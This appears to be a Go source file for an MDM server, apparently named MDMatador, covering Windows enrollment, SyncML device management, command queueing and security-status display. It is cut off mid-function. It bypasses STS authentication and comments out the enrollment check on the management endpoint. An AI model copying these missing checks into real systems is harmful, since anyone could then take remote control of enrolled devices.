package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/marcosd4h/MDMatador/internal/mdm"
	"github.com/marcosd4h/MDMatador/internal/request"
	"github.com/marcosd4h/MDMatador/internal/response"
)

// MS-MDE2 Discovery Endpoint
// discoveryHandler implements the discovery service for MDM enrollment.
// This is the first step in the enrollment process.
// When a client request message (DiscoverRequest) is received, the server processes the request and returns response (DiscoverResponse) message.
// The response identifies the endpoints to be used by the client to obtain the security tokens and perform the enrollment.
// See section 3.1 in MS-MDE2 spec
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mde/7a24266d-9932-49af-9c60-3e93902a4ea2
func (app *application) discoveryHandler(w http.ResponseWriter, r *http.Request) {

	switch r.Method {
	case http.MethodGet:
		// Used during auto-discovery lookup to the EnterpriseEnrollment FQDN
		w.WriteHeader(http.StatusOK)

	case http.MethodPost:
		// Getting the SOAP request
		soapReq, err := request.SoapRequest(r)
		if err != nil {
			app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEDiscovery, soapReq.MessageID(), err)
			return
		}

		// Checking if the request is a valid Discovery request
		err = soapReq.IsValidDiscoveryMsg()
		if err != nil {
			app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEDiscovery, soapReq.MessageID(), err)
			return
		}

		//Preparing the response
		//The baseURL is the FQDN used for the next steps in the enrollment process
		mdmDomain := app.config.baseURL

		// Getting the DiscoveryResponse message content
		urlPolicyEndpoint, err := mdm.ResolveWindowsMDMPolicy(mdmDomain)
		if err != nil {
			app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEDiscovery, soapReq.MessageID(), err)
			return
		}

		urlEnrollEndpoint, err := mdm.ResolveWindowsMDMEnroll(mdmDomain)
		if err != nil {
			app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEDiscovery, soapReq.MessageID(), err)
			return
		}

		// Checking if this request was programmatically triggered
		programmaticOK, err := soapReq.IsProgrammaticDiscovery()
		if err != nil {
			app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEDiscovery, soapReq.MessageID(), err)
			return
		}

		//AuthPolicy is determined by programmatic enrollment
		authPolicy := mdm.AuthOnPremise

		// STS Auth Endpoint is only required for user-driven MDM enrollment flows
		urlAuthEndpoint := ""
		if !programmaticOK {
			authPolicy = mdm.AuthFederated
			urlAuthEndpoint, err = mdm.ResolveWindowsMDMAuth(mdmDomain)
			if err != nil {
				app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEDiscovery, soapReq.MessageID(), err)
				return
			}
		}

		soapMsg, err := mdm.NewDiscoverResponse(authPolicy, urlPolicyEndpoint, urlEnrollEndpoint, urlAuthEndpoint)
		if err != nil {
			app.serverError(w, r, err)
			app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEDiscovery, soapReq.MessageID(), err)
			return
		}

		// Sending the response
		err = response.SOAPResponse(w, http.StatusOK, soapReq.MessageID(), soapMsg)
		if err != nil {
			app.serverError(w, r, err)
			return
		}
	}
}

// MS-MDE2 Policy Endpoint
// policyHandler implements the interaction with the X.509 Certificate Enrollment Policy Protocol [MS-XCEP] to obtain the certificate enrollment policies.
// The XCEP Protocol is a minimal messaging protocol that includes a single client request message (GetPolicies) with a matching server response message (GetPoliciesResponse).
// See section 3.3 in MS-MDE2 spec
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mde/130d42d0-549d-4ba2-ae05-1145f5c1d83b
// See also MS-XCEP spec for details on the X.509 Certificate Enrollment Policy Protocol
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-xcep/08ec4475-32c2-457d-8c27-5a176660a210
func (app *application) policyHandler(w http.ResponseWriter, r *http.Request) {
	// Getting the SOAP request
	soapReq, err := request.SoapRequest(r)
	if err != nil {
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEPolicy, soapReq.MessageID(), err)
		return
	}

	// Checking if the request is a valid GetPolicy request
	err = soapReq.IsValidGetPolicyMsg()
	if err != nil {
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEPolicy, soapReq.MessageID(), err)
		return
	}

	//Preparing the response
	soapMsg, err := mdm.NewGetPoliciesResponse(mdm.MinKeyLength, mdm.CertValidityPeriodInSecs, mdm.CertRenewalPeriodInSecs)
	if err != nil {
		app.serverError(w, r, err)
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEPolicy, soapReq.MessageID(), err)
		return
	}

	// Sending the response
	err = response.SOAPResponse(w, http.StatusOK, soapReq.MessageID(), soapMsg)
	if err != nil {
		app.serverError(w, r, err)
		return
	}
}

// MS-MDE2 STS Auth Endpoint
// authHandler is the HTTP endpoint path that delivers the Security Token Service (STS) functionality.
// The MS-MDE2 protocol is agnostic to the token format and value returned by this endpoint.
// This endpoint is only required for user-driven MDM enrollment flows.
// The STS opaque value can be used to authenticate the user to the MDM endpoints if needed,
// here we are just bypassing the process by returning an HTML that self-post
// to the internal protocol handler exposed by the MDM enrollment client.
// See the section 3.2 on the MS-MDE2 specification for more details:
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mde2/27ed8c2c-0140-41ce-b2fa-c3d1a793ab4a
func (app *application) authHandler(w http.ResponseWriter, r *http.Request) {

	//get querystring params from request
	queryParams := r.URL.Query()

	// Sanity check on the expected appru param
	if !queryParams.Has(mdm.STSAuthAppRu) {
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDESTSAuth, "STS Context", errors.New("expected STS param not present"))
		return
	}

	appru := queryParams.Get(mdm.STSAuthAppRu)
	if len(appru) == 0 {
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDESTSAuth, "STS Context", errors.New("expected STS param is empty"))
		return
	}

	//Preparing the STS response
	soapMsg, err := mdm.GetAuthSTSResponse(appru)
	if err != nil {
		app.serverError(w, r, err)
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDESTSAuth, "STS Context", err)
		return
	}

	// Sending the response
	err = response.RawResponse(w, http.StatusOK, http.Header{}, mdm.WebContainerContentType, soapMsg)
	if err != nil {
		app.serverError(w, r, err)
		return
	}
}

// MS-MDE2 Enroll Endpoint
// enrollHandler implements the interaction with the XWS-Trust X.509v3 Token Enrollment Extensions [MS-WSTEP] to complete the certificate enrollment.
// When a client request message (RequestSecurityToken) is received, the server processes the request and returns response (RequestSecurityTokenResponse) message.
// See section 3.4 in MS-MDE2 spec
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mde/eaf62392-677b-47b2-a69d-95df2b164e58
// See also MS-WSTEP spec for details on the WS-Trust X.509v3 Token Enrollment Extensions
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wstep/4766a85d-0d18-4fa1-a51f-e5cb98b752ea
func (app *application) enrollHandler(w http.ResponseWriter, r *http.Request) {
	// Getting the SOAP request
	soapReq, err := request.SoapRequest(r)
	if err != nil {
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEEnrollment, soapReq.MessageID(), err)
		return
	}

	// Checking first if RequestSecurityToken message is valid and returning error if this is not the case
	err = soapReq.IsValidRequestSecurityTokenMsg()
	if err != nil {
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEEnrollment, soapReq.MessageID(), err)
		return
	}

	// Getting the RequestSecurityToken message from the SOAP request
	reqSecurityTokenMsg, err := soapReq.GetRequestSecurityTokenMessage()
	if err != nil {
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEEnrollment, soapReq.MessageID(), err)
		return
	}

	// Getting the RequestSecurityTokenResponseCollection message
	enrollResponseMsg, err := app.getMDMWindowsEnrollResponse(reqSecurityTokenMsg)
	if err != nil {
		app.serverSoapError(w, mdm.SoapErrorEnrollmentServer, mdm.MDEEnrollment, soapReq.MessageID(), err)
		return
	}

	// Sending the response
	err = response.SOAPResponse(w, http.StatusOK, soapReq.MessageID(), enrollResponseMsg)
	if err != nil {
		app.serverError(w, r, err)
		return
	}
}

// MS-MDM Management Endpoint
// managementHandler implements the the Microsoft Mobile Device Management Protocol (MS-MDM)
// The MS-MDM protocol is used for managing devices that have previously enrolled into a management system through the MS-MDE protocol
// The MS-MDM protocol is a subset of the Open Mobile Association Device Management (OMA DM) Protocol (OMA-DM) version
// See MS-MDM spec for more details
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mdm/d8ef69b5-0d09-4ecc-8154-977586b764c6
// See also OMA DM spec for more details
// https://www.openmobilealliance.org/release/DM/V1_2_1-20080617-A/OMA-TS-DM_Protocol-V1_2_1-20080617-A.pdf
func (app *application) managementHandler(w http.ResponseWriter, r *http.Request) {
	// Getting the SyncML request
	msgReq, err := request.SyncMLRequest(r)
	if err != nil {
		app.serverSyncMLError(w, err)
		return
	}

	// Checking if the request is a valid SyncML request
	err = msgReq.IsValidMsg()
	if err != nil {
		app.serverSyncMLError(w, err)
		return
	}

	// Checking if the calling device is already enrolled
	deviceID, err := msgReq.GetSource()
	if err != nil || deviceID == "" {
		app.serverSyncMLError(w, err)
		return
	}

	/*
		if !app.db.MDMIsValidDeviceID(deviceID) {
			app.serverSyncMLError(w, errors.New("device is not enrolled"))
			return
		}
	*/

	// Updating the last seen tracking
	err = app.db.MDMUpdateLastSeen(deviceID)
	if err != nil {
		app.serverSyncMLError(w, err)
		return
	}

	// Preparing the SyncML message response by processing the incoming operations and pending operations
	// to get the response protocol commands that will be transported in the SyncML response
	msgRes, err := app.cmdManager.GetResponseSyncMLCommand(msgReq)
	if err != nil {
		return
	}

	// Sending the response
	err = response.SyncMLResponse(w, http.StatusOK, msgRes)
	if err != nil {
		app.serverError(w, r, err)
		return
	}
}

// storeWindowsMDMEnrolledDevice stores the device information to the list of MDM enrolled devices
func (app *application) storeWindowsMDMEnrolledDevice(userID string, secTokenMsg *mdm.RequestSecurityToken) error {
	const (
		error_tag = "windows MDM enrolled storage: "
	)

	// Getting the DeviceID context information from the RequestSecurityToken msg
	reqDeviceID, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemDeviceID)
	if err != nil {
		return fmt.Errorf("%s %v", error_tag, err)
	}

	// Getting the HWDevID context information from the RequestSecurityToken msg
	reqHWDevID, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemHWDevID)
	if err != nil {
		return fmt.Errorf("%s %v", error_tag, err)
	}

	// Getting the Enroll DeviceName context information from the RequestSecurityToken msg
	reqDeviceName, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemDeviceName)
	if err != nil {
		return fmt.Errorf("%s %v", error_tag, err)
	}

	// Getting the Enroll DeviceType context information from the RequestSecurityToken msg
	reqDeviceType, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemDeviceType)
	if err != nil {
		return fmt.Errorf("%s %v", error_tag, err)
	}

	// Getting the OS Locale context information from the RequestSecurityToken msg
	reqOSLocale, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemLocale)
	if err != nil {
		return fmt.Errorf("%s %v", error_tag, err)
	}

	// Getting the OS Edition context information from the RequestSecurityToken msg
	reqRawOSEdition, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemOSEdition)
	if err != nil {
		return fmt.Errorf("%s %v", error_tag, err)
	}

	// Getting the friendly OS Edition name from the raw OS Edition name
	reqOSEdition := mdm.GetFriendlyOSEdition(reqRawOSEdition)

	// Getting the OSVersion information from the RequestSecurityToken msg
	reqOSVersion, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemOSVersion)
	if err != nil {
		return fmt.Errorf("%s %v", error_tag, err)
	}

	// Getting the RequestVersion context information from the RequestSecurityToken msg
	reqClientVersion, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemApplicationVersion)
	if err != nil {
		return fmt.Errorf("%s %v", error_tag, err)
	}

	// Getting the Windows Enrolled Device Information
	enrolledDevice := &mdm.MDMWindowsEnrolledDevice{
		ID:            reqDeviceID,
		HWID:          reqHWDevID,
		Name:          reqDeviceName,
		Type:          reqDeviceType,
		OSLocale:      reqOSLocale,
		OSEdition:     reqOSEdition,
		OSVersion:     reqOSVersion,
		LastSeen:      "",
		ClientVersion: reqClientVersion,
	}

	if err := app.db.MDMInsertEnrolledDevice(enrolledDevice); err != nil {
		return err
	}

	return nil
}

// queueInitialOperations stores the initial operations for the device
func (app *application) queueInitialOperations(secTokenMsg *mdm.RequestSecurityToken) error {

	// Getting the DeviceID context information from the RequestSecurityToken msg
	reqDeviceID, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemDeviceID)
	if err != nil {
		return fmt.Errorf("storeInitialOperations %v", err)
	}

	err = app.cmdManager.SetInitialOperations(reqDeviceID)
	if err != nil {
		return fmt.Errorf("setInitialOperations %v", err)
	}

	return nil
}

// removeWindowsDeviceIfAlreadyMDMEnrolled removes the device if already MDM enrolled
// DeviceID is used to check the list of enrolled devices
func (app *application) removeWindowsDeviceIfAlreadyMDMEnrolled(secTokenMsg *mdm.RequestSecurityToken) error {
	// Getting the HWDeviceID from the RequestSecurityToken msg
	reqDeviceHWID, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemHWDevID)
	if err != nil {
		return err
	}

	// Checking the storage to see if the device is already enrolled
	device, err := app.db.MDMGetEnrolledDeviceByHWID(reqDeviceHWID)
	if err != nil {
		return err
	}

	// Device is already enrolled, let's remove it
	if device != nil {
		err = app.db.MDMDeleteEnrolledDeviceByHWID(device.HWID)
		if err != nil {
			return err
		}
	}

	// device is not enrolled, nothing to do
	return nil
}

// getDeviceProvisioningInformation returns a valid WapProvisioningDoc
// This is the provisioning information that will be sent to the Windows MDM Enrollment Client
// This information is used to configure the device management client
// See section 2.2.9.1 for more details on the XML provision schema used here
// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mde2/35e1aca6-1b8a-48ba-bbc0-23af5d46907a
func (app *application) getDeviceProvisioningInformation(secTokenMsg *mdm.RequestSecurityToken) (string, error) {
	// Getting the DeviceID from the RequestSecurityToken msg
	reqDeviceID, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemDeviceID)
	if err != nil {
		return "", err
	}

	// Getting the EnrollmentType information from the RequestSecurityToken msg
	reqEnrollType, err := secTokenMsg.GetContextItem(mdm.ReqSecTokenContextItemEnrollmentType)
	if err != nil {
		return "", err
	}

	// Getting the BinarySecurityToken from the RequestSecurityToken msg
	binSecurityTokenData, err := secTokenMsg.GetBinarySecurityTokenData()
	if err != nil {
		return "", err
	}

	// Getting the BinarySecurityToken type from the RequestSecurityToken msg
	binSecurityTokenType, err := secTokenMsg.GetBinarySecurityTokenType()
	if err != nil {
		return "", err
	}

	// Getting the client CSR request from the device
	clientCSR, err := mdm.GetClientCSR(binSecurityTokenData, binSecurityTokenType)
	if err != nil {
		return "", err
	}

	// Getting the signed, DER-encoded certificate bytes and its uppercased, hex-endcoded SHA1 fingerprint
	rawSignedCertDER, rawSignedCertFingerprint, err := app.identityManager.SignClientCSR(reqDeviceID, clientCSR)
	if err != nil {
		return "", err
	}

	// Preparing client certificate and identity certificate information to be sent to the Windows MDM Enrollment Client
	certStoreProvisioningData := mdm.NewCertStoreProvisioningData(
		reqEnrollType,
		*app.identityManager.IdentityFingerprint,
		app.identityManager.IdentityCertificate.Raw,
		rawSignedCertFingerprint,
		rawSignedCertDER)

	// Getting the MS-MDM management URL to provision the device
	urlManagementEndpoint, err := mdm.ResolveWindowsMDMManagement(app.config.baseURL)
	if err != nil {
		return "", err
	}

	// Preparing the Application Provisioning information
	appConfigProvisioningData := mdm.NewApplicationProvisioningData(urlManagementEndpoint)

	// Preparing the DM Client Provisioning information
	appDMClientProvisioningData := mdm.NewDMClientProvisioningData()

	// And finally returning the Base64 encoded representation of the Provisioning Doc XML
	provDoc := mdm.NewProvisioningDoc(certStoreProvisioningData, appConfigProvisioningData, appDMClientProvisioningData)
	encodedProvDoc, err := provDoc.GetEncodedB64Representation()
	if err != nil {
		return "", err
	}

	return encodedProvDoc, nil
}

// GetMDMWindowsEnrollResponse returns a valid RequestSecurityTokenResponseCollection message
// secTokenMsg is the RequestSecurityToken message
// authToken is the base64 encoded binary security token
func (app *application) getMDMWindowsEnrollResponse(secTokenMsg *mdm.RequestSecurityToken) (*mdm.RequestSecurityTokenResponseCollection, error) {

	// Removing the device if already MDM enrolled
	err := app.removeWindowsDeviceIfAlreadyMDMEnrolled(secTokenMsg)
	if err != nil {
		return nil, fmt.Errorf("device enroll check: %v", err)
	}

	// Getting the device provisioning information in the form of a WapProvisioningDoc
	deviceProvisioning, err := app.getDeviceProvisioningInformation(secTokenMsg)
	if err != nil {
		return nil, fmt.Errorf("device provisioning information: %v", err)
	}

	// Getting the RequestSecurityTokenResponseCollection message content
	secTokenResponseCollectionMsg, err := mdm.NewRequestSecurityTokenResponseCollection(deviceProvisioning)
	if err != nil {
		return nil, fmt.Errorf("creation of RequestSecurityTokenResponseCollection message: %v", err)
	}

	// RequestSecurityTokenResponseCollection message is ready. The identity
	// and provisioning information will be sent to the Windows MDM Enrollment Client

	// But before doing that, let's save the device information to the list
	// of MDM enrolled MDM devices
	err = app.storeWindowsMDMEnrolledDevice(mdm.DefaultC2UPN, secTokenMsg)
	if err != nil {
		return nil, fmt.Errorf("enrolled device information cannot be stored: %v", err)
	}

	// And finally returning the RequestSecurityTokenResponseCollection message
	err = app.queueInitialOperations(secTokenMsg)
	if err != nil {
		return nil, fmt.Errorf("initial operations for the enrolled device cannot be stored: %v", err)
	}

	// And finally returning the RequestSecurityTokenResponseCollection message
	return secTokenResponseCollectionMsg, nil
}

// getDeviceInfoHandler implements the device management for a given device
func (app *application) getDeviceInfoHandler(w http.ResponseWriter, r *http.Request) {

	data := app.newTemplateData(r)

	ctx := r.Context()
	device, ok := ctx.Value(mdmDeviceContextKey).(*mdm.MDMWindowsEnrolledDevice)
	if !ok {
		app.serverError(w, r, errors.New("deviceRemoveHandler: device not found in context"))
		return
	}

	// Checking the storage to see if the device is already enrolled
	device, err := app.db.MDMGetEnrolledDevice(device.ID)
	if err != nil {
		app.serverError(w, r, err)
		return
	}

	// Sanity check on device
	if device == nil {
		app.serverError(w, r, errors.New("dashboardDevice device not found"))
		return
	}

	// Getting the device available settings
	deviceSettings, err := app.db.GetDeviceSettings(device.ID)
	if err != nil {
		app.serverError(w, r, err)
		return
	}

	// Preparing the device information to be sent to the dashboard
	data["Device"] = device
	data["Settings"] = app.getTemplateDeviceSetting(deviceSettings, app.config.baseURL)

	err = response.Page(w, http.StatusOK, data, "pages/device_management.tmpl")
	if err != nil {
		app.serverError(w, r, err)
	}
}

// getDeviceTerminalHandler implements the terminal management for a given device
func (app *application) getDeviceTerminalHandler(w http.ResponseWriter, r *http.Request) {

	data := app.newTemplateData(r)

	ctx := r.Context()
	device, ok := ctx.Value(mdmDeviceContextKey).(*mdm.MDMWindowsEnrolledDevice)
	if !ok {
		app.serverError(w, r, errors.New("deviceRemoveHandler: device not found in context"))
		return
	}

	// Checking the storage to see if the device is already enrolled
	device, err := app.db.MDMGetEnrolledDevice(device.ID)
	if err != nil {
		app.serverError(w, r, err)
		return
	}

	// Sanity check on device
	if device == nil {
		app.serverError(w, r, errors.New("dashboardDevice device not found"))
		return
	}

	// Getting the device available settings
	deviceSettings, err := app.db.GetDeviceSettings(device.ID)
	if err != nil {
		app.serverError(w, r, err)
		return
	}

	// Preparing the device information to be sent to the dashboard
	data["Device"] = device
	data["Settings"] = app.getTemplateDeviceSetting(deviceSettings, app.config.baseURL)

	err = response.Page(w, http.StatusOK, data, "pages/device_terminal.tmpl")
	if err != nil {
		app.serverError(w, r, err)
	}
}

// deviceManagementHandler implements the device management for a given device
func (app *application) deviceManagementHandler(w http.ResponseWriter, r *http.Request) {
	ctx := r.Context()
	device, ok := ctx.Value(mdmDeviceContextKey).(*mdm.MDMWindowsEnrolledDevice)
	if !ok {
		app.serverError(w, r, errors.New("deviceRemoveHandler: device not found in context"))
		return
	}

	switch r.Method {
	case http.MethodDelete:
		// Checking the storage to see if the device is already enrolled
		device, err := app.db.MDMGetEnrolledDevice(device.ID)
		if err != nil {
			app.serverError(w, r, err)
			return
		}

		// Device is already enrolled, let's remove it
		if device != nil {
			// TODO: Add logic to MDM unenroll the device
			err = app.db.MDMDeleteEnrolledDevice(device.ID)
			if err != nil {
				app.serverError(w, r, err)
				return
			}
		}

	case http.MethodPost:
		var deviceOp mdm.PendingDeviceOperation
		err := request.DecodeJSON(w, r, &deviceOp)
		if err != nil {
			app.badRequest(w, r, err)
			return
		}

		err = app.db.QueueProtoCmdOperation(deviceOp.DeviceID, deviceOp.CmdVerb, deviceOp.SettingURI, deviceOp.SettingValue)
		if err != nil {
			app.serverError(w, r, err)
			return
		}
	}
}

// getTemplateDeviceSetting returns the device settings in a format that can be used by the template
func getFormattedLocalTime(input string) string {

	layout := "2006-01-02T15:04:05.9999999-07:00"

	t, err := time.Parse(layout, input)
	if err != nil {
		return input
	}

	return t.Format(time.RFC822)
}

// getGBdataSize returns the data size in GB
func getGBdataSize(input string) string {
	bytes, err := strconv.ParseUint(input, 10, 64)
	if err != nil {
		return "Invalid input"
	}
	const unit = 1024 * 1024 * 1024 // GB
	valueInGB := float64(bytes) / float64(unit)
	return fmt.Sprintf("%.1f GB", valueInGB)
}

// getToogleValue returns the toggle value (checked or empty)
func getToogleValue(input string) string {

	if input == "true" {
		return "checked"
	}

	return ""
}

// getToogleValue returns the toggle value (checked or empty)
func getToogleInt(input string) string {

	if input == "1" {
		return "checked"
	}

	return ""
}

// getToogleValueNotEmpty returns the toggle value (checked or empty)
func getToogleValueNotEmpty(input string) string {

	if len(input) > 0 {
		return "checked"
	}

	return ""
}

// getToogleCustomValue returns the toggle value (checked or empty)
func getToogleCustomValue(input string, disableValue string) string {

	if len(input) > 0 && input != disableValue {
		return ""
	}

	return "checked"
}

// Strings values gathered from CSP Documentation
// ./Vendor/MSFT/DeviceStatus/Antivirus
// https://learn.microsoft.com/en-us/windows/client-management/mdm/devicestatus-csp
func getParsedAntivirusStatus(input string) string {

	switch input {
	case "0":
		return "Antivirus is on and monitoring"
	case "1":
		return "Antivirus is disabled"
	case "2":
		return "Antivirus isn't monitoring the device"
	case "3":
		return "Antivirus is temporarily not completely monitoring the device"
	case "4":
		return "Antivirus not applicable for this device"
	}

	return "Status " + input
}

func getToogledAntivirusStatus(input string) string {

	switch input {
	case "0":
		return "Checked"
	case "1":
		return ""
	case "2":
		return ""
	case "3":
		return ""
	case "4":
		return ""
	}

	return ""
}

// Strings values gathered from CSP Documentation
// ./Vendor/MSFT/DeviceStatus/Antivirus/SignatureStatus
// https://learn.microsoft.com/en-us/windows/client-management/mdm/devicestatus-csp
func getAntivirusSignatureStatus(input string) string {

	switch input {
	case "0":
		return "The security software reports that it isn't the most recent version"
	case "1":
		return "The security software reports that it's the most recent version"
	case "2":
		return "Not applicable"
	}

	return "Status " + input
}

// Strings values gathered from CSP Documentation
// ./Vendor/MSFT/DeviceStatus/DeviceGuard/HypervisorEnforcedCodeIntegrityStatus
// https://learn.microsoft.com/en-us/windows/client-management/mdm/devicestatus-csp
func getHVCIStatus(input string) string {

	switch input {
	case "0":
		return "Running"
	case "1":
		return "Reboot required"
	case "2":
		return "Not configured"
	case "3":
		return "VBS not running"
	}

	return "Status " + input
}

// Strings values gathered from CSP Documentation
// ./Vendor/MSFT/DeviceStatus/DeviceGuard/VirtualizationBasedSecurityStatus
// https://learn.microsoft.com/en-us/windows/client-management/mdm/devicestatus-csp
func getVirtualizationBasedSecurityStatus(input string) string {

	switch input {
	case "0":
		return "Running"
	case "1":
		return "Reboot required"
	case "2":
		return "64 bit architecture required"
	case "3":
		return "Not licensed"
	case "4":
		return "Not configured"
	case "5":
		return "System doesn't meet hardware requirements"
	case "42":
		return "Other"
	}

	return "Status " + input
}

// Strings values gathered from CSP Documentation
// ./Vendor/MSFT/DeviceStatus/DeviceGuard/LsaCfgCredGuardStatus
// https://learn.microsoft.com/en-us/windows/client-management/mdm/devicestatus-csp
func getLsaCfgCredGuardStatus(input string) string {

	switch input {
	case "0":
		return "Running"
	case "1":
		return "Reboot required"
	case "2":
		return "Not licensed for Credential Guard"
	case "3":
		return "Not configured"
	case "4":
		return "VBS not running"
	}

	return "Status " + input
}

// Strings values gathered from CSP Documentation
// ./Vendor/MSFT/DeviceStatus/Firewall/Status
// https://learn.microsoft.com/en-us/windows/client-management/mdm/devicestatus-csp
func getSystemFirewallStatus(input string) string {

	switch input {
	case "0":
		return "Firewall is on and monitoring"
	case "1":
		return "Firewall has been disabled"
	case "2":
		return "Firewall isn't monitoring all networks or some rules have been turned off"
	case "3":
		return "Firewall is temporarily not monitoring all networks"
	case "4":
		return "Not applicable"
	}

	return "Status " + input
}

// Strings values gathered from CSP Documentation
// ./Vendor/MSFT/DeviceStatus/Firewall/Status
// https://learn.microsoft.com/en-us/windows/client-management/mdm/devicestatus-csp
func getSystemFirewallToggleStatus(input string) string {

	if input == "0" {
		return "checked"
	}

	return ""
}

// Strings values gathered from CSP Documentation
// ./Vendor/MSFT/DeviceStatus/DeviceGuard/SystemGuardStatus
// https://learn.microsoft.com/en-us/windows/client-management/mdm/devicestatus-csp
func getSystemGuardStatus(input string) string {

	switch input {
	case "0":
		return "Running"
	case "1":
		return "Reboot required"
	case "2":
		return "Not configured"
	case "3":
		return "System doesn't meet hardware requirements"
	}

	return "Status " + input
}

// getDeviceInfoHandler implements the device management for a given device
func (app *application) getTemplateDeviceSetting(deviceSettings []*mdm.KSDeviceSetting, baseURL string) mdm.TemplateDeviceSetting {

	var deviceSetting = mdm.TemplateDeviceSetting{
		DNSComputerName:            mdm.CSPDefaultValue,
		DeviceID:                   mdm.CSPDefaultValue,
		HWDevID:                    mdm.CSPDefaultValue,
		SMBIOS:                     mdm.CSPDefaultValue,
		DeviceName:                 mdm.CSPDefaultValue,
		WindowsEdition:             mdm.CSPDefaultValue,
		WindowsVersion:             mdm.CSPDefaultValue,
		OSLocale:                   mdm.CSPDefaultValue,
		DeviceManufacturer:         mdm.CSPDefaultValue,
		DeviceModel:                mdm.CSPDefaultValue,
		Localtime:                  mdm.CSPDefaultValue,
		FirmwareVersion:            mdm.CSPDefaultValue,
		HardwareVersion:            mdm.CSPDefaultValue,
		BIOSVersion:                mdm.CSPDefaultValue,
		AntivirusStatus:            mdm.CSPDefaultValue,
		AntivirusSignatureStatus:   mdm.CSPDefaultValue,
		HVCIStatus:                 mdm.CSPDefaultValue,
		DeviceGuardStatus:          mdm.CSPDefaultValue,
		CredentialGuardStatus:      mdm.CSPDefaultValue,
		SystemGuardStatus:          mdm.CSPDefaultValue,
		EncryptionComplianceStatus: mdm.CSPDefaultValue,
		SecureBootStatus:           mdm.CSPDefaultValue,
		FirewallStatus:             mdm.CSPDefaultValue,
		CDiskSize:                  mdm.CSPDefaultValue,
		CDiskFreeSpace:             mdm.CSPDefaultValue,
		CDiskSystemType:            mdm.CSPDefaultValue,
		TotalRAM:                   mdm.CSPDefaultValue,
	}

	// Getting the device available settings
	for _, setting := range deviceSettings {
		switch setting.SettingURI {
		case mdm.CSPDNSComputerName:
			deviceSetting.DNSComputerName = setting.SettingValue
		case mdm.CSPDeviceID:
			deviceSetting.DeviceID = setting.SettingValue
		case mdm.CSPHWDevID:
			deviceSetting.HWDevID = setting.SettingValue
		case mdm.CSPSMBIOS:
			deviceSetting.SMBIOS = setting.SettingValue
		case mdm.CSPDeviceName:
			deviceSetting.DeviceName = setting.SettingValue
		case mdm.CSPWindowsEdition:
			deviceSetting.WindowsEdition = setting.SettingValue
		case mdm.CSPWindowsVersion:
			deviceSetting.WindowsVersion = setting.SettingValue
		case mdm.CSPOSLocale:
			deviceSetting.OSLocale = setting.SettingValue
		case mdm.CSPDeviceManufacturer:
			deviceSetting.DeviceManufacturer = setting.SettingValue
		case mdm.CSPDeviceModel:
			deviceSetting.DeviceModel = setting.SettingValue
		case mdm.CSPLocaltime:
			deviceSetting.Localtime = getFormattedLocalTime(setting.SettingValue)
		case mdm.CSPFirmwareVersion:
			deviceSetting.FirmwareVersion = setting.SettingValue
		case mdm.CSPHardwareVersion:
			deviceSetting.HardwareVersion = setting.SettingValue
		case mdm.CSPBIOSVersion:
			deviceSetting.BIOSVersion = setting.SettingValue
		case mdm.CSPAntivirusStatus:
			deviceSetting.AntivirusStatus = getParsedAntivirusStatus(setting.SettingValue)
		case mdm.CSPAntivirusSignatureStatus:
			deviceSetting.AntivirusSignatureStatus = getAntivirusSignatureStatus(setting.SettingValue)
		case mdm.CSPHVCIStatus:
			deviceSetting.HVCIStatus = getHVCIStatus(setting.SettingValue)
		case mdm.CSPDeviceGuardStatus:
			deviceSetting.DeviceGuardStatus = getVirtualizationBasedSecurityStatus(setting.SettingValue)
		case mdm.CSPCredentialGuardStatus:
			deviceSetting.CredentialGuardStatus = getLsaCfgCredGuardStatus(setting.SettingValue)
		case mdm.CSPSystemGuardStatus:
			deviceSetting.SystemGuardStatus = getSystemGuardStatus(setting.SettingValue)
		case mdm.CSPEncryptionComplianceStatus:
			deviceSetting.EncryptionComplianceStatus = setting.SettingValue
		case mdm.CSPSecureBootStatus:
			deviceSetting.SecureBootStatus = setting.SettingValue
		case mdm.CSPFirewallStatus:
			deviceSetting.FirewallStatus = getSystemFirewallStatus(setting.SettingValue)
			deviceSetting.ControlFirewall = getSystemFirewallToggleStatus(setting.SettingValue)
		case mdm.CSPCDiskSize:
			deviceSetting.CDiskSize = getGBdataSize(setting.SettingValue)
		case mdm.CSPCDiskFreeSpace:
